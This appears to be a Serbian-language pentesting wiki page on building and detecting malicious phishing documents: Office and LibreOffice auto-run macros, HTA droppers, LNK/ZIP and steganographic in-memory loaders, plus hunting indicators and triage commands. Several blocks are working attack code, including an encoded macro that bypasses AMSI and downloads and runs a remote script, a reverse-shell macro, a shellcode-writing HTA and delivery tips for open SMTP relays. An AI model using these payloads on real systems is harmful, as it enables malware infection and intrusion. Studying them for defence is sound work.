# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word obavlja validaciju podataka u fajlu pre nego što ga otvori. Validacija podataka se obavlja identifikacijom strukture podataka prema standardu OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl se neće otvoriti.

Obično Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije i pritom zadržati mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali DOCM fajl preimenovan u RTF otvoriće se u programu Microsoft Word i moći će da izvršava makroe.\
Isti interni mehanizmi važe za sve programe iz paketa Microsoft Office (Excel, PowerPoint itd.).

Možete da koristite sledeću komandu da proverite koje će ekstenzije izvršavati neki Office programi:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX datoteke koje upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži macros takođe mogu da „izvršavaju” macros.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Kategorije**: Links and References, **Nazivi polja**: includePicture i **Naziv datoteke ili URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Za analizu primljenog dokumenta umesto pravljenja novog, pogledajte [VBA macro analysis: junk code and UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macros Backdoor

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda za macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document** da biste otvorili Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Uradite to zato što **ne možete da sačuvate macro-e u `.docx`** i zato što postoji **negativna stigma** oko macro-enabled ekstenzije **`.docm`** (npr. ikona sličice ima veliko `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zato je ova **nasleđena `.doc` ekstenzija najbolji kompromis**.

#### Generatori zlonamernih macro-a

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macro-i (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic macro-e i da ih automatski izvršavaju kada se datoteka otvori, tako što se macro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan reverse shell macro izgleda ovako:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Napomena: dvostruki navodnici (`""`) unutar stringa — LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payloadi koji se završavaju sa `...==""")` imaju ispravno uparene i unutrašnju komandu i Shell argument.

Saveti za isporuku:

- Sačuvajte dokument kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Pri slanju e-pošte pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan da bi se kao prilog poslali bajtovi datoteke, a ne njen naziv). Ovo je ključno pri zloupotrebi SMTP servera koji prihvataju proizvoljne primaoce `RCPT TO` bez validacije.

## HTA datoteke

HTA je Windows program koji **objedinjuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa „potpunim poverenjem“, bez ograničenja bezbednosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, zbog čega `mshta` zavisi od IE-a. Dakle, ako je deinstaliran, HTA datoteke neće moći da se izvršavaju.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Lažne kartice priloga u HTML emailu

HTML email može da imitira izvornu karticu za pregled priloga nekog provajdera, umesto da sadrži pravi prilog. Talos je uočio Gmail karticu sastavljenu od četiri inline PNG MIME dela kodirana u Base64 formatu. Cela vizuelna celina bila je obuhvaćena jednim anchor elementom, a vrednost primaoca u `?m=<target-id>` omogućavala je praćenje po primaocu. Link je počinjao sa `//` umesto sa `http://` ili `https://`; pregledači razrešavaju taj relativni oblik protokola, ali alati za izdvajanje URL-ova koji prepoznaju samo potpuno kvalifikovane URL-ove mogu da ga previde.<sup>[[11]](#references)</sup>

Tokom analize pregledajte sirovi MIME umesto da se oslanjate na prikazanu listu priloga. Rekonstruišite kako inline slikovni delovi čine vizuelnu karticu, utvrdite koji anchor element je obuhvata i normalizujte `href` vrednosti sa relativnim oblikom protokola pre izdvajanja URL-ova.<sup>[[11]](#references)</sup>

Za testiranje lažiranja pošiljaoca u envelope/header poljima i DMARC usklađenosti, pogledajte [mere protiv lažiranja SMTP pošte](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Iznuđivanje NTLM autentifikacije

Postoji nekoliko načina da se **NTLM autentifikacija iznudi „na daljinu“**; na primer, možete da dodate **nevidljive slike** u emailove ili HTML stranice kojima će korisnik pristupiti (čak i HTTP MitM?). Žrtvi možete da pošaljete i **putanju do datoteka** koje će **pokrenuti** **autentifikaciju** samim **otvaranjem fascikle.**

**Pogledajte ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo da ukradete hash ili podatke za autentifikaciju, već možete i da **izvršite NTLM relay napade**:

- [**NTLM relay napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do sertifikata)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK za lokalno postavljanje komandi pomoću `ftp.exe`

Prečica može da pokrene `ftp.exe -s:icon.ico` uz tekstualnu datoteku komandi koja je prikrivena ekstenzijom slike.<sup>[[12]](#references)</sup> Opcija `-s:` čita lokalne FTP komande; u Windows 8 i novijim verzijama ta datoteka mora da bude kodirana u UTF-8 formatu.<sup>[[13]](#references)</sup> Linija koja počinje sa `!` pokreće lokalnu komandu preko `cmd /c`, bez slanja te komande FTP serveru. Za ovaj put lokalnog izvršavanja nije potrebna FTP veza.<sup>[[14]](#references)</sup> U opisnom lancu, FTP skripta je došla do druge datoteke komandi. Važna je cela linija koja počinje sa `!`: `!more res.ico` samo prikazuje datoteku, dok cevovod ka `cmd` izvršava njen sadržaj.<sup>[[12]](#references)[[14]](#references)</sup>

Isti lanac je koristio ponavljajući zadatak za ponovno čitanje upisive datoteke komandi, umesto instaliranja novog izvršnog fajla pri svakom ažuriranju. Akcija zadatka bila je `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; datoteka je sadržala komandu koja je pri pokretanju preuzimala instrukcije. Srodna varijanta je preuzimala zamensku datoteku komandi pre zakazanog pokretanja. Datoteka mora da postoji i da bude čitljiva kada se zadatak pokrene; `conhost` ne podiže privilegije zadatka iznad konfigurisanog korisničkog tokena.<sup>[[12]](#references)</sup> Za mehaniku zadataka pogledajte [izvršavanje putem zakazanih zadataka](../../windows-hardening/lateral-movement/atexec.md).

## LNK u VHDX-u sa skrivenim MSI-jem i lažnim dokumentom

Montirani VHDX može da prikaže vidljivu LNK datoteku, a da MSI i lažnu tabelu istovremeno sakrije u istom volumenu. U opisanom lancu, LNK je koristio `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Separator `&` otvara lažni dokument čak i ako komanda instalera ne uspe; otvaranje dokumenta ne dokazuje da je instalacija uspešno obavljena. Ovo je varijanta isporuke [izvršavanja MSI custom-action-a](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), a ne eskalacija privilegija putem MSI-ja sama po sebi.<sup>[[12]](#references)</sup>

Za ovaj MSI, `CustomAction.Type` **194** kombinuje EXE smešten u tabeli `Binary` (**2**) sa zastavicama za ignorisanje povratnog koda (**64**) i asinhrono izvršavanje (**128**). Kombinacija **64 + 128** znači da Windows Installer ne čeka da se EXE završi; sama zastavica 128 bi čekala do kraja sekvence.<sup>[[15]](#references)[[16]](#references)</sup> Pre nego što izvršavanje pripišete tom ugrađenom EXE-u, proverite `Source` akcije u odnosu na tabelu `Binary` i njen položaj u `InstallExecuteSequence`.<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC putanja može da isporuči udaljeni MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), ali to je drugačija ulazna tačka.

## LNK loaderi + payload-i ugrađeni u ZIP (fileless lanac)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna lažna dokumenta (PDF/DOCX) i zlonamerni .lnk fajl. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a, iza jedinstvenog markera, a .lnk ga izdvaja i pokreće u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Uobičajen tok koji implementira PowerShell jednolinijska komanda iz .lnk fajla:

1) Pronađe originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i u roditeljskoj fascikli trenutnog radnog direktorijuma.
2) Pročita bajtove ZIP-a i pronađe hardkodirani marker (npr. xFIQCV). Sve posle markera predstavlja ugrađeni PowerShell payload.
3) Kopira ZIP u %ProgramData%, tamo ga raspakuje i otvara lažni .docx da bi delovao legitimno.
4) Zaobilazi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Dekodira sledeću fazu (npr. uklanjanjem svih znakova #) i izvršava je u memoriji.

Primer PowerShell osnove za izdvajanje i pokretanje ugrađene faze:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Beleške
- Isporuka često zloupotrebljava poddomene renomiranih PaaS platformi (npr. *.herokuapp.com) i može da ograniči pristup payload-ima (isporučuje bezazlene ZIP-ove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi se smanjili tragovi na disku.

Postojanost korišćena u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokreće payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Potraga/IOCs
- ZIP datoteke koje sadrže ASCII markerski string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji pretražuje nadređene fascikle/korisničke fascikle da bi pronašao ZIP i otvorio dokument-mamac.
- AMSI tampering preko [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne prepiske koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## LNK staging sa mamcem na prvom mestu → postojanost preko zakazanog zadatka → trusted CPL side-loading

Još jedan obrazac koji se ponavlja jeste **`.lnk` koji se predstavlja kao dokument** i odmah otvara bezazlen mamac, dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>

Uočeni tok rada:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje zamaskiranog PowerShell downloader-a.
2. PowerShell deli očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) tako da jednostavne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument-mamac**, otvara ga za žrtvu, a zatim u pozadini ponovo sastavlja zlonamerne datoteke.
4. Payload-i mogu biti zapisani sa **besmislenim ekstenzijama**, a zatim preimenovani uklanjanjem suvišnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Postojanost se uspostavlja pomoću **zakazanog zadatka koji se pokreće svakog minuta** i pokreće pouzdanu host binarnu datoteku sa putanje na koju korisnik može da upisuje.

Minimalni tragovi za potragu prema ovom obrascu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Koristan raspored fajlova za staging koji treba prepoznati:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza neupadljiva

U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio **`RunFODW`**, pouzdani Microsoftov binarni fajl učitavao je attackerov CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita blob **AES-256-CBC** iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Alocira izvršivu memoriju i kopira dešifrovani shellcode u nju
- Indirektno ga izvršava tako što prosleđuje pokazivač na shellcode kao callback funkciji **`EnumUILanguagesW`**

Vredi posebno tražiti taj poslednji korak: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prihvata callback** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao završni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u trenutnom procesu pre nego što je predao izvršavanje. Za detaljnije beleške o side-loading-u i post-obradi koja se odvija u memoriji, pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktične tačke za potragu:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe`, a zatim prikazuje vidljiv dokument-mamac.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena trenutnim preimenovanjem fajlova sa besmislenim ekstenzijama.
- Zakazani zadaci sa bezazlenim nazivima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
- Pouzdani binarni fajlovi koji učitavaju fajlove **`.cpl` / `.dll`** iz istog direktorijuma koji nije sistemski.
- Base64 tekstualni blobovi upisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.

## Payloadi omeđeni steganografskim markerima u slikama (PowerShell stager)

Noviji lanci loadera isporučuju zamaskirani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži .NET DLL kodiran u Base64 i sakriven kao običan tekst između jedinstvenih početnih i završnih markera. Skripta traži te graničnike (primeri zabeleženi u divljini: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, dekodira ga iz Base64 u bajtove, učitava assembly u memoriju i poziva poznatu ulaznu metodu prosleđujući joj C2 URL.<sup>[[5]](#references)</sup>

Tok rada
- Faza 1: JS/VBS dropper u arhivi → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, izdvaja Base64 omeđen markerima, učitava .NET DLL u memoriju i poziva njegovu metodu (npr. VAI), prosleđujući joj C2 URL i opcije.
- Faza 3: Loader preuzima završni payload i obično ga ubacuje pomoću process hollowing-a u pouzdani binarni fajl (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih uslužnih programa pogledajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET metode u memoriji:

<details>
<summary>PowerShell ekstraktor stego payloada i loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganografija/sakrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju od kampanje do kampanje.
- AMSI/ETW bypass i deobfuskacija stringova obično se primenjuju pre učitavanja assembly-ja.
- Lov na pretnje: skenirajte preuzete slike u potrazi za poznatim graničnicima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

Pogledajte i stego alate i tehnike izdvajanja podataka:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS dropperi → Base64 PowerShell staging

Čest početni korak je mali, snažno obfuskiran `.js` ili `.vbs` fajl isporučen u arhivi. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` radi pokretanja sledeće faze preko HTTPS-a.<sup>[[5]](#references)</sup>

Osnovna logika (apstraktno):
- Pročitaj sadržaj sopstvenog fajla
- Pronađi Base64 blob između besmislenih stringova
- Dekodiraj u ASCII PowerShell
- Izvrši pomoću `wscript.exe`/`cscript.exe`, koji pokreće `powershell.exe`

Indikatori za lov na pretnje
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz privremenih putanja korisnika.

## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)

Microsoft Management Console fajlovi (`.msc`) su XML definicije konzole koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** zloupotrebljava referencu `StringTable` ka resursu `apds.dll` koji sadrži staru XSS ranjivost, pa otvaranje posebno napravljenе konzole od strane korisnika pokreće JavaScript unutar `mmc.exe`. U posmatranim uzorcima kombinovana je obfuskacija zasnovana na `transformNode` sa **DotNetToJScript** radi instanciranja .NET payload-a, bez uobičajenog puta preko Office makroa.<sup>[[9]](#references)</sup>

Za statičku trijažu, tretirajte nepouzdan MSC kao tekst i **nemojte ga otvarati dvostrukim klikom**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Pivoti u runtime-u sa visokim signalom su slučajevi kada `mmc.exe` učitava CLR ili skriptne komponente, uspostavlja mrežne veze ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivanu izvršnu datoteku. Format je legitiman, zato detekcije treba da povezuju **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>

## PDF/QR preusmerivači i kontrola isporuke payload-a

PDF ne mora da sadrži exploit da bi bio koristan. U novijim kampanjama, u dokumentu koji izgleda bezazleno nalazi se **QR kod ili obična veza** koja preusmerava sesiju pregledača izvan kontrola pošte i prilagođava odredište adresi primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do infrastrukture za krađu akreditiva RaccoonO365; u paralelnom lancu korišćena je provera IP-a/okruženja kako bi se odabranim posetiocima prikazala putanja JavaScript/MSI, a skenerima ili klijentima kojima pristup nije dozvoljen bezazlen PDF.<sup>[[10]](#references)</sup>

Tokom trijaže proverite i PDF radnje i renderovane QR kodove. QR kod može biti nacrtan vektorski, a ne sačuvan kao slika koja se može izdvojiti, zato rasterizujte svaku stranicu, pored izdvajanja ugrađenih slika:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez autentifikacije. Korisni indikatori za potragu uključuju PDF-ove koji sadrže samo QR kod uz gotovo prazna tela poruka, adresu e-pošte primaoca ugrađenu u parametar upita, nekoliko preusmeravanja preko pouzdanih hosting servisa i različit sadržaj u zavisnosti od IP adrese, geolokacije, kolačića, referrera ili user-agenta. Uporedite zahteve pomoću kontrolisanih profila jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>

## Windows datoteke za krađu NTLM hash-eva

Proverite stranicu o **mestima za krađu NTLM kredencijala**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na kompanije u SAD-u](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Zlonamerni softver à la Mode: praćenje tradecraft-a Dropping Elephant kroz lanac loader-a sa temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Otmica TypeLib-a – nova COM tehnika za postojanost (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje razne infostealer-e](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografija (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Proxy izvršavanje pomoću pouzdanih developerskih alata: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za pokretanje phishing kampanja s poreskom tematikom](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Lanac isporuke UAT-11587 i backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER proširuje svoj arsenal pomoću PapRAT-a](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - komanda ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - prilagođeni tip radnje 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - opcije obrade povratnih vrednosti prilagođenih radnji](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
